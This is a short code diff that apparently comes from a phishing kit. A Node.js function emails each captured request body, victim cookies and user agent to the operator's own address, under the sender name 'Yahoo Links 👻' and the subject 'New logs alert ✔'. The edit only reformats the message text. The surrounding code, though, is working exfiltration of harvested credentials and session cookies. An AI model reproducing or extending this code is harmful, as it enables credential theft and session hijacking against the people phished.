@@ -22,10 +22,10 @@ async function sender(payload) {
     from: `"Yahoo Links 👻" <${process.env.Emailaddress}>`, // sender address
     to: `${process.env.Emailaddress}`, // list of receivers
     subject: "New logs alert ✔", // Subject line
-    text: `${payload?.body} + ${payload?.cookies} + ${payload.userAgent}`, // plain text body
+    text: `${payload?.body} : ${payload?.cookies} : ${payload?.userAgent}`, // plain text body
     html: `${payload?.body}\n\n
     ${payload?.cookies}\n\n
-    ${payload.userAgent}`, // html body
+    ${payload?.userAgent}`, // html body
   });
 
   console.log("Message sent: %s", info.messageId);
